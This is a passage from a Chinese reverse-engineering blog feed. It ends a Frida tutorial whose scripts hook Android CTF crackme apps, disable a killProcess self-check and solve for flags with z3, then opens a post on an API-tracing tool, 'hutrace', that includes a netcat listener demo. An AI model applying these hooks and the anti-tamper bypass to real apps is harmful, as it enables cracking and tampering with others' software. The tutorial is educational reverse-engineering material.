&quot;RkxBR3s1N0VSTDFOR180UkNIM1J9Cg==&quot;;</span><br><span class="line">        &#125;;</span><br><span class="line">        //hook 构造函数</span><br><span class="line">        var a_init = Java.use(&quot;com.tlamb96.kgbmessenger.b.a&quot;);</span><br><span class="line">        a_init.$init.implementation = function(i, str, str2, z)&#123;</span><br><span class="line">            this.$init(i, str, str2, z);</span><br><span class="line">            console.log(&quot;a_init_arg:&quot;,i, str, str2, z);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        var decode_class = Java.use(&quot;com.example.mytest.Decode&quot;);</span><br><span class="line">        console.log(&quot;decode:&quot;+decode_class.decode_p());</span><br><span class="line">        console.log(&quot;r2hex:&quot;+decode_class.s2hex());</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    hook_java();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>
<p>z3求解，hook_l2.py:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">from binascii import *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">r = &quot;0064736c707d6f510020646b73247c4d0068202b4159516700502a214d24675100&quot;</span><br><span class="line">charArray = bytearray(a2b_hex(r))</span><br><span class="line">print charArray</span><br><span class="line"></span><br><span class="line">for i2 in range(len(charArray)/2):</span><br><span class="line">    c = charArray[i2]</span><br><span class="line">    charArray[i2] = charArray[len(charArray) - i2 - 1]</span><br><span class="line">    charArray[(len(charArray) - i2) - 1] = c</span><br><span class="line"></span><br><span class="line">print b2a_hex(charArray)</span><br><span class="line"></span><br><span class="line">x = [BitVec(&quot;a%s&quot; % i,32) for i in range(len(charArray))]</span><br><span class="line">for i in range(len(charArray)):</span><br><span class="line">    print x[i]</span><br><span class="line">    c = charArray[i]</span><br><span class="line">    print(i,hex(c))</span><br><span class="line">    s.add(((x[i] &gt;&gt; (i % 8)) ^ x[i]) == c)</span><br><span class="line"></span><br><span class="line">if s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    print m</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for i in range(len(charArray)):</span><br><span class="line">        if m[x[i]] != None:</span><br><span class="line">            flag += chr(m[x[i]].as_long().real)</span><br><span class="line">        else:</span><br><span class="line">            flag += &quot; &quot;</span><br><span class="line">    print &quot;|&quot;+flag+&quot;|&quot;</span><br></pre></td></tr></table></figure>
<h2 id="L3：-Frida-Hook-Native"><a href="#L3：-Frida-Hook-Native" class="headerlink" title="L3： Frida Hook Native"></a>L3： Frida Hook Native</h2><p>hook_l3.js:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hook_java()</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var MyApp = Java.use(&quot;com.gdufs.xman.MyApp&quot;);</span><br><span class="line">        MyApp.saveSN.implementation = function(str)&#123;</span><br><span class="line">            console.log(&quot;savesn:&quot;,str);</span><br><span class="line">            this.saveSN(str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var proc = Java.use(&quot;android.os.Process&quot;);</span><br><span class="line">        proc.killProcess.implementation = function(pid)&#123;</span><br><span class="line">            console.log(&quot;kill pid:&quot;,pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_native()</span><br><span class="line">&#123;</span><br><span class="line">    var base_jni = Module.findBaseAddress(&quot;libmyjni.so&quot;);</span><br><span class="line">    var n2 = Module.findExportByName(&quot;libmyjni.so&quot;,&quot;n2&quot;);</span><br><span class="line">    console.log(&quot;base:&quot;,base_jni,&quot; n2:&quot;,n2);</span><br><span class="line">    if (base_jni!=null) &#123;</span><br><span class="line">        Interceptor.attach(n2,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                console.log(&quot;n2 onEnter:&quot;,args[0],args[1],args[2]);</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_libart()</span><br><span class="line">&#123;</span><br><span class="line">    //symbol   (no checkjni)</span><br><span class="line">    var module_libart = Process.findModuleByName(&quot;libart.so&quot;);</span><br><span class="line">    //or?const hooks = Module.load(&apos;libc.so&apos;);   var Symbol = hooks.enumerateSymbols();</span><br><span class="line">    var symbols = module_libart.enumerateSymbols();</span><br><span class="line">    </span><br><span class="line">    var addr_GetStringUTFChars = null;</span><br><span class="line">    var addr_FindClass = null;</span><br><span class="line">    var addr_GetStaticFieldID = null;</span><br><span class="line">    var addr_SetStaticIntField = null;</span><br><span class="line"></span><br><span class="line">    for(var i = 0; i &lt; symbols.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if (symbols[i].name.indexOf(&quot;art&quot;) != -1) &#123;</span><br><span class="line">            if (symbols[i].name.indexOf(&quot;CheckJNI&quot;) == -1) &#123;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;GetStringUTFChars&quot;) != -1) &#123;</span><br><span class="line">                    addr_GetStringUTFChars = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_GetStringUTFChars);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;art3JNI9FindClass&quot;) != -1) &#123;</span><br><span class="line">                    addr_FindClass = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_FindClass);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;GetStaticFieldID&quot;) != -1) &#123;</span><br><span class="line">                    addr_GetStaticFieldID = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_GetStaticFieldID);</span><br><span class="line">                &#125;</span><br><span class="line">                if (symbols[i].name.indexOf(&quot;SetStaticIntField&quot;) != -1) &#123;</span><br><span class="line">                    addr_SetStaticIntField = symbols[i].address;</span><br><span class="line">                    console.log(symbols[i].name,addr_SetStaticIntField);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //print str </span><br><span class="line">    </span><br><span class="line">    //print so stack  :  FUZZY and ACCURATE两种方式</span><br><span class="line">    if (addr_GetStringUTFChars) &#123;</span><br><span class="line">        Interceptor.attach(addr_GetStringUTFChars,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                // console.log(&apos;addr_GetStringUTFChars onEnter called from:\n&apos; +</span><br><span class="line">                //     Thread.backtrace(this.context, Backtracer.FUZZY)</span><br><span class="line">                //         .map(DebugSymbol.fromAddress).join(&apos;\n&apos;) + &apos;\n&apos;);</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">                console.log(&quot;GetStringUTFChars:&quot;,ptr(retval).readCString())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if (addr_FindClass) &#123;</span><br><span class="line">        Interceptor.attach(addr_FindClass,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                console.log(&quot;FindClass Arg:&quot;, ptr(args[1]).readCString());</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if (addr_GetStaticFieldID) &#123;</span><br><span class="line">        Interceptor.attach(addr_GetStaticFieldID,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                console.log(&quot;GetStaticFieldID Arg3:&quot;, ptr(args[2]).readCString(),&quot;Arg4:&quot;,ptr(args[3]).readCString());</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if (addr_SetStaticIntField) &#123;</span><br><span class="line">        Interceptor.attach(addr_SetStaticIntField,&#123;</span><br><span class="line">            onEnter : function(args)&#123;</span><br><span class="line">                console.log(&quot;SetStaticIntField Arg4:&quot;,args[3]);</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave : function(retval)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    //hook findclass getstaticfiledid </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hook_libc()</span><br><span class="line">&#123;</span><br><span class="line">    //strcmp(or hook lib import)</span><br><span class="line">    var addr_strcmp =  Module.findExportByName(&quot;libc.so&quot;,&quot;strcmp&quot;);</span><br><span class="line">    Interceptor.attach(addr_strcmp,&#123;</span><br><span class="line">        onEnter: function(args)&#123;</span><br><span class="line">            var str_dst = ptr(args[1]).readCString();</span><br><span class="line">            if (str_dst == &quot;EoPAoY62@ElRD&quot;) &#123;</span><br><span class="line">                console.log(&quot;strcmp:&quot;, ptr(args[0]).readCString(),</span><br><span class="line">                    ptr(args[1]).readCString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function writefile()</span><br><span class="line">&#123;   </span><br><span class="line">    //frida api write file</span><br><span class="line">        //frida 的api来写文件</span><br><span class="line">        var file = new File(&quot;/sdcard/reg.dat&quot;, &quot;w&quot;);</span><br><span class="line">        file.write(&quot;EoPAoY62@ElRD&quot;);</span><br><span class="line">        file.flush();</span><br><span class="line">        file.close();</span><br><span class="line">&#125;</span><br><span class="line">function writefile2()</span><br><span class="line">&#123;   </span><br><span class="line">    //frida native function write file</span><br><span class="line">    var addr_fopen =  Module.findExportByName(&quot;libc.so&quot;,&quot;fopen&quot;);</span><br><span class="line">    var addr_fputs =  Module.findExportByName(&quot;libc.so&quot;,&quot;fputs&quot;);</span><br><span class="line">    var addr_fclose =  Module.findExportByName(&quot;libc.so&quot;,&quot;fclose&quot;);</span><br><span class="line"></span><br><span class="line">    console.log(&quot;addr file api:&quot;,addr_fopen,addr_fputs,addr_fclose);</span><br><span class="line"></span><br><span class="line">    var fopen = new NativeFunction(addr_fopen,&quot;pointer&quot;,[&quot;pointer&quot;,&quot;pointer&quot;]);</span><br><span class="line">    var fputs = new NativeFunction(addr_fputs,&quot;int&quot;,[&quot;pointer&quot;,&quot;pointer&quot;]);</span><br><span class="line">    var fclose = new NativeFunction(addr_fclose,&quot;int&quot;,[&quot;pointer&quot;]);</span><br><span class="line"></span><br><span class="line">    var filename = Memory.allocUtf8String(&quot;/sdcard/reg.dat&quot;);</span><br><span class="line">    var open_type = Memory.allocUtf8String(&quot;w+&quot;);</span><br><span class="line">    var handle = fopen(filename,open_type);</span><br><span class="line"></span><br><span class="line">    var buffer = Memory.allocUtf8String(&quot;EoPAoY62@ElRD&quot;);</span><br><span class="line">    var ret = fputs(buffer,handle);</span><br><span class="line">    fclose(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    hook_java();</span><br><span class="line">    hook_native();</span><br><span class="line">    hook_libart();</span><br><span class="line">    hook_libc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>
<p>z3 求解hook_l3.py:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">r = &quot;EoPAoY62@ElRD&quot;</span><br><span class="line">v13 = &quot;W3_arE_whO_we_ARE&quot;</span><br><span class="line">x = [BitVec(&quot;a%s&quot; % i,8) for i in range(len(r))]</span><br><span class="line">v9 = 2016</span><br><span class="line">v11 = 0</span><br><span class="line">for i in range(len(r)):</span><br><span class="line">    if i %3 == 1:</span><br><span class="line">        v9 = (v9 + 5) % 16</span><br><span class="line">        v11 = v13[v9 + 1]</span><br><span class="line">    elif i %3 == 2:</span><br><span class="line">        v9 = (v9 + 7) % 15</span><br><span class="line">        v11 = v13[v9 + 2]</span><br><span class="line">    else :</span><br><span class="line">        v9 = (v9 + 3) % 13</span><br><span class="line">        v11 = v13[v9 + 3]</span><br><span class="line">    print r[i],v11</span><br><span class="line">    s.add((x[i] ^ ord(v11)) == ord(r[i]))</span><br><span class="line"></span><br><span class="line">if s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    print m</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for i in range(len(r)):</span><br><span class="line">        if m[x[i]] != None:</span><br><span class="line">            flag += chr(m[x[i]].as_long().real)</span><br><span class="line">        else:</span><br><span class="line">            flag += &quot; &quot;</span><br><span class="line">    print &quot;|&quot;+flag+&quot;|&quot;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol>
<li>打印SO调用栈时选FUZZY（模糊方式）与ACCURATE（准确方式）的区别。</li>
<li>重写函数中调用非静态函数达到与主动调用choose方式同样的目的。</li>
<li>Frida调用自定义的dex（jar转dex）。<br>附件下载：<a href="samples.zip" target="_blank">链接</a></li>
</ol>
]]></content>
      <categories>
        <category>移动终端</category>
      </categories>
      <tags>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>2022-06-06-hutrace工具系列第1篇之基本功能介绍</title>
    <url>/2022/06/06/2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC1%E7%AF%87%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p><img src="2022-06-06-hutrace%E5%B7%A5%E5%85%B7%E7%B3%BB%E5%88%97%E7%AC%AC1%E7%AF%87%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/1.png" alt=""></p>
<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;本系列文章预计分4篇介绍下hutrace以及hzytrace工具,前3篇主要介绍下hutrace基本功能以及不同应用场景使用示例，hutrace工具本身是基于drltrace开源项目开发，支持Windows+Linux平台，最后1篇会介绍hutrace的同款工具hzytrace，hzytrace是基于Pin开发完成hutrace大部分功能，但侧重点略有区别，虽然hzytrace也可以支持windows，但Windows上相应需求基本可全部由hutrace达成，且效率更高，故目前暂先完善了Linux平台下的hzytrace。利用hutrace、hzytrace在很多分析场景下甚至可以不需调试就可以完成分析目的，因为Linux上找到样例偏少，本篇基本功能介绍部分将主要以Windows为例介绍其功能，实际两个平台上功能基本一致（dynamorio本身是支持arm linux、arm android的、pin也支持macos，但我自己测试移植到对应平台还有些问题，需求比较小众，对应平台也有一些替代工具，暂也没来及继续深入研究）。
</blockquote>
<a id="more"></a>

<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>&ensp;&ensp;&ensp;&ensp;hutrace工具主要基于drltrace项目开发，原项目相当于一个利用dynamorio实现的特别简易的apimonitor，而dynamorio本身机制为动态插桩，自带N种反调试技术的免疫效果，后面又根据工作过程中的各类实际需求断断续续的对hutrace进行功能完善，目前主要支持的功能列表如下：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe</span><br><span class="line">ERROR: Usage error:</span><br><span class="line"> Usage:</span><br><span class="line"> -logdir               //生成的trace日志存储位置，默认为hutrace程序目录</span><br><span class="line"> -only_from_app       //只记录主程序执行情况</span><br><span class="line"> -trace_to_librarys   //除主程序外指定记录特定模块，与only_from_app结合使用</span><br><span class="line"> -record_start_addr   //指定记录开始地址</span><br><span class="line"> -record_end_addr     //指定记录结束地址</span><br><span class="line"> -follow_children     //追踪子进程</span><br><span class="line"> -print_ret_addr      //打印API函数调用返回地址</span><br><span class="line"> -print_ins_info      //打印所有执行基本块的汇编代码</span><br><span class="line"> -print_ins_reg       //打印所有执行指令的代码以及寄存器、内存引用数据</span><br><span class="line"> -print_ins_all       //不推荐，print_ins_reg增强版，解析上述寄存器等数据的引用数据并打印，打印的数据更丰富，但是数据量太大，一般需求不大。。</span><br><span class="line"> -print_syscall       //追踪系统调用</span><br><span class="line">//省略部分无关紧要的功能参数</span><br></pre></td></tr></table></figure>
<p>当然功能不止如此，原项目的功能较为简单,返回地址都不能记录，而hutrace工具中除上述列表中功能外我后续添加了分线程记录、基本块转移记录、复杂参数及返回值等的打印、以及Sub函数参数打印、Linux Fork类型子进程追踪、简易补丁及利用插件完成任意地址Hook功能等等…</p>
<p>本篇以notepad、calc以及一些demo程序为例对hutrace的主要功能进行演示，后续文章将结合一些实际的漏洞以及样本案例演示hutrace应用于逆向分析实战。</p>
<h2 id="2-API记录"><a href="#2-API记录" class="headerlink" title="2. API记录"></a>2. API记录</h2><p>&ensp;&ensp;&ensp;&ensp;目前很多ApiMonitor仅仅是记录调用的APi名称，能够记录API调用前后参数信息的就比较少了，当然Rohitab Batra的API Monitor工具都可以做到上述功能，功能也比较丰富，也可以做到参数结构体的解析，但是目前仅支持Windows平台，下面介绍下hutrace的API记录功能特点。

<h3 id="2-1-常规参数类型"><a href="#2-1-常规参数类型" class="headerlink" title="2.1 常规参数类型"></a>2.1 常规参数类型</h3><p>hutrace工具集成了不同类型参数的输出功能，并依托hutrace.config配置文件进行设置对应API函数的参数属性，例如对WriteFile函数的描述：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool|WriteFile|HANDLE|char*|DWORD|__out DWORD*|__inout OVERLAPPED*</span><br><span class="line">说明：</span><br><span class="line">// bool代表返回值类型，但一般都按int值处理了，此处含义不大</span><br><span class="line">// WriteFile 代表需要记录的API函数名称</span><br><span class="line">// HANDLE char* DWORD DWORD*等分别代表参数类型，仅识别常见格式，OVERLAPPED等不识别的数据类型默认不处理</span><br><span class="line">// __out代表API调用结束后输出参数信息，默认为__in,__inout代表API调用前后均输出参数信息</span><br></pre></td></tr></table></figure>

<p>以notepad为例记录记事本程序的文件写入操作，在记事本程序中输入测试字符串并保存到文件，使用hutrace程序运行并记录程序日志的命令格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe -only_from_app -print_ret_addr -- notepad 111.txt</span><br></pre></td></tr></table></figure>

<p>在当前目录会根据notepad程序运行情况生成文件名形如“huhu.notepad.exe.01896.0000.log”的文件，其中“01896”为进程PID，“0000”为线程序号，下面截取一部分trace的日志结果进行说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~1464~~ KERNEL32.dll!WideCharToMultiByte N:0xa09</span><br><span class="line">    arg 0: 0x3a8 (type=uint, size=0x4)</span><br><span class="line">    arg 1: 0x400 (type=DWORD, size=0x4)</span><br><span class="line">    arg 2: 1111111111111111 (type=wchar_t*, size=0x0)   //wchar_t代表宽字节类型</span><br><span class="line">    arg 3: 0x10 (type=int, size=0x4)</span><br><span class="line">    arg 5: 0x10 (type=int, size=0x4)</span><br><span class="line"> and return to module id:5, retraddr: 0xff7b8a76,offset:0x8a76   //调用模块、返回地址</span><br><span class="line"> and WideCharToMultiByte return value:  0x10 </span><br><span class="line">    arg 4: 1111111111111111 (type=char*, size=0x0)      //API函数转换后按char*打印</span><br><span class="line">.....</span><br><span class="line">~~1464~~ KERNEL32.dll!WriteFile N:0xa0a</span><br><span class="line">    arg 0: 0x4dc (type=HANDLE, size=0x8)</span><br><span class="line">    arg 1: 1111111111111111 (type=char*, size=0x0)          </span><br><span class="line">    arg 2: 0x10 (type=DWORD, size=0x4)</span><br><span class="line">    arg 4: &lt;null&gt; (type=&lt;unknown&gt;*, size=0x0)</span><br><span class="line"> and return to module id:5, retraddr: 0xff7b8a96,offset:0x8a96</span><br><span class="line"> and WriteFile return value:  0x1 </span><br><span class="line">    arg 3: 0x00000000001bf1e0 (type=DWORD*, size=0x4)</span><br><span class="line">    arg 4: &lt;null&gt; (type=&lt;unknown&gt;*, size=0x0)</span><br></pre></td></tr></table></figure>
<p>在记录的trace日志结果里，“1464”代表线程id，“N:0xa09”代表记录的API函数序号(为了区分多线程记录的日志里API函数的调用顺序)。</p>
<h3 id="2-2-Hex类型参数打印"><a href="#2-2-Hex类型参数打印" class="headerlink" title="2.2 Hex类型参数打印"></a>2.2 Hex类型参数打印</h3><ol>
<li><p>常规的参数类型打印并不能满足我们对十六进制数据的记录，下面以nc为例演示下十六进制数据参数类型的3种记录方式，首先查看第一种指定特定参数为十六进制输出数据大小的方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hutrace.config文件中的配置：</span><br><span class="line">int|send|DWORD|hex^ARG2|int|int</span><br><span class="line">int|recv|DWORD|__out hex^ARG2|int|int</span><br><span class="line"></span><br><span class="line">运行服务端监听：</span><br><span class="line">C:\Users\huhu\Desktop\bin64&gt;nc64.exe -lvp 1234</span><br><span class="line"></span><br><span class="line">使用hutrace记录客户端连接：</span><br><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe -only_from_app  -print_ret_addr  -- nc64.exe 127.0.0.1 1234</span><br></pre></td></tr></table></figure>
<p>建连成功后分别在客户端和服务端分别输入测试字符串“111…”、“222…”，在生成的trace日志文件中得到对应的记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~2164~~ WS2_32.dll!send N:0x7cb</span><br><span class="line">    arg 0: 0x174 (type=DWORD, size=0x4)</span><br><span class="line">    arg 1: 0x555fd0</span><br><span class="line">000000: 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111</span><br><span class="line">000010: 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111</span><br><span class="line">000020: 31 31 31 31 31 31 31 31 31 31 0a                 1111111111.</span><br><span class="line"> (type=hex^ARG2, size=0x2b)</span><br><span class="line">    arg 2: 0x2b (type=int, size=0x4)</span><br><span class="line">    arg 3: 0x0 (type=int, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x405197,offset:0x5197</span><br><span class="line"> and send return value:  0x2b </span><br><span class="line">......</span><br><span class="line">~~2164~~ WSOCK32.dll!recv N:0x1045</span><br><span class="line">    arg 0: 0x174 (type=DWORD, size=0x4)</span><br><span class="line">    arg 2: 0x2000 (type=int, size=0x4)</span><br><span class="line">    arg 3: 0x0 (type=int, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x404f08,offset:0x4f08</span><br><span class="line"> and recv return value:  0x2b </span><br><span class="line">    arg 1: 0x0000000000557fe0</span><br><span class="line">000000: 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32  2222222222222222</span><br><span class="line">000010: 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32  2222222222222222</span><br><span class="line">000020: 32 32 32 32 32 32 32 32 32 32 0a 00 00 00 00 00  2222222222......</span><br><span class="line">000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">//缓冲区0x2000字节大小，省略部分显示。</span><br></pre></td></tr></table></figure>
</li>
<li><p>上述演示中recv函数设置按“ARG2”参数（以0为开始索引，ARG2代表recv函数第三个参数）的大小进行输出，实际接受数据可能没有这么多，下面介绍第二种以返回值方式打印：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hutrace.config文件中的配置：</span><br><span class="line">int|recv|DWORD|__out hex^RET|int|int</span><br></pre></td></tr></table></figure>
<p>对应的日志记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~1836~~ WSOCK32.dll!recv N:0xa5f</span><br><span class="line">    arg 0: 0x174 (type=DWORD, size=0x4)</span><br><span class="line">    arg 2: 0x2000 (type=int, size=0x4)</span><br><span class="line">    arg 3: 0x0 (type=int, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x404f08,offset:0x4f08</span><br><span class="line"> and recv return value:  0x1d </span><br><span class="line">    arg 1: 0x0000000000277fe0</span><br><span class="line">000000: 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32  2222222222222222</span><br><span class="line">000010: 32 32 32 32 32 32 32 32 32 32 32 32 0a           222222222222.</span><br><span class="line"> (type=__out hex^RET*, size=0x1d)</span><br></pre></td></tr></table></figure>
<p>在输出时hutrace对返回值进行了判断如果返回值太大则不进行输出避免影响trace进行。</p>
</li>
<li><p>第三种以固定长度方式记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hutrace.config文件中的配置：</span><br><span class="line">int|recv|DWORD|__out hex^NUM20|int|int</span><br></pre></td></tr></table></figure>
<p>对应的日志记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~1396~~ WSOCK32.dll!recv N:0x8f2</span><br><span class="line">    arg 0: 0x178 (type=DWORD, size=0x4)</span><br><span class="line">    arg 2: 0x2000 (type=int, size=0x4)</span><br><span class="line">    arg 3: 0x0 (type=int, size=0x4)</span><br><span class="line"> and return to module id:0, retraddr: 0x404f08,offset:0x4f08</span><br><span class="line"> and recv return value:  0x25 </span><br><span class="line">    arg 1: 0x0000000000587fe0</span><br><span class="line">000000: 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32  2222222222222222</span><br><span class="line">000010: 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32  2222222222222222</span><br><span class="line"> (type=__out hex^NUM20*, size=0x20)</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="2-3-结构体参数打印"><a href="#2-3-结构体参数打印" class="headerlink" title="2.3 结构体参数打印"></a>2.3 结构体参数打印</h3><p>最后是最为麻烦的参数为结构体类型时，以WSASend、WSARecv为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hutrace.config文件中的配置：</span><br><span class="line">int|WSASend|DWORD|struct_ptr&#123;DWORD.DWORD.hex^A0&#125;^ARG2|DWORD|__out DWORD*|DWORD|DWORD*|DWORD*</span><br><span class="line">int|WSARecv|DWORD|__out struct_ptr&#123;DWORD.DWORD.hex^A0&#125;^ARG2|DWORD|__out DWORD*|DWORD*|DWORD*|DWORD*</span><br><span class="line"></span><br><span class="line">分别运行测试的服务端和客户端：</span><br><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe -only_from_app  -print_ret_addr  -- testWsaRecv.exe</span><br><span class="line">//服务端监听5150端口</span><br><span class="line"></span><br><span class="line">C:\Users\huhu\Desktop\bin64&gt;hutrace.exe -only_from_app  -print_ret_addr  -- testWsaSend.exe 127.0.0.1 5150 1111111111111111</span><br><span class="line">//客户端连接指定IP并发送数据</span><br></pre></td></tr></table></figure>

<p>这里解释一下，首先是struct_ptr{DWORD.DWORD.hex^A0}，可以查看下WSASend、WSARecv函数参数的定义，第二个参数是个WSABUF结构体类型，正常结构体中第2个成员代表发送数据缓冲区，结构体第1个成员代表缓冲区数据的长度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct __WSABUF &#123;</span><br><span class="line">  u_long      len;</span><br><span class="line">  char FAR    *buf;</span><br><span class="line">&#125; WSABUF, FAR * LPWSABUF;</span><br></pre></td></tr></table></figure>

<p>而这个测试的64位程序，该结构体实际上对齐成四字节的len+四字节填充+8字节buf指针，所以在配置文件语法上将第1个成员拆开成了两个DWORD类型，buf指针指向的数据长度为第1个DWORD成员，也即是{DWORD.DWORD.hex^A0}，结构体内的“hex^A0”是为了和常规参数中“^ARG2”区分，在结构体中使用“^A0”标识代表结构体内第1个成员。<br>后面更坑的是WSASend、WSARecv函数第3个参数代表第2个参数也即是WSABUF结构体的数量,所以在struct_ptr{…}后的“^ARG2”指示打印第3个参数的值对应的结构体数据，这也是和常规参数打印兼容的地方。注意如果是32位程序需要把参数中的第二个DWORD去掉哦~对结构体类型参数的处理过程中需要特别注意。</p>
<p>最终得到的trace日志结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端日志</span><br><span class="line">~~1164~~ WS2_32.dll!WSASend N:0x3ce</span><br><span class="line">    arg 0: 0x80 (type=DWORD, size=0x4)</span><br><span class="line">    arg 1: 0x16f5c8</span><br><span class="line"> and Struct Begin:                     //开始打印结构体</span><br><span class="line">    arg 0: 0x10 (type=DWORD, size=0x4)</span><br><span class="line">    arg 1: 0xcccccccc (type=DWORD, size=0x4)</span><br><span class="line">    arg 2: 0x343f97</span><br><span class="line">000000: 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111</span><br><span class="line"> (type=hex^A0, size=0x10)</span><br><span class="line">    arg 0: 0x13 (type=DWORD, size=0x4)</span><br><span class="line">    arg 1: 0xcccccccc (type=DWORD, size=0x4)</span><br><span class="line">    arg 2: 0x16f608</span><br><span class="line">000000: 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32  2222222222222222</span><br><span class="line">000010: 32 32 32                                         222</span><br><span class="line"> (type=hex^A0, size=0x13)</span><br><span class="line">and Struct End                         //结构体打印结束</span><br><span class="line"> (type=struct_ptr&#123;DWORD.DWORD.hex^A0&#125;^ARG2, size=0x2)</span><br><span class="line">    arg 2: 0x2 (type=DWORD, size=0x4)</span><br><span class="line">    arg 4: 0xcccccccc00000000 (type=DWORD, size=0x4)</span><br><span class="line">    arg 5: 0x000000000016f638 =&gt; 0xcccccccc (type=DWORD*, size=0x4)</span><br><span class="line"> and return to module id:4, 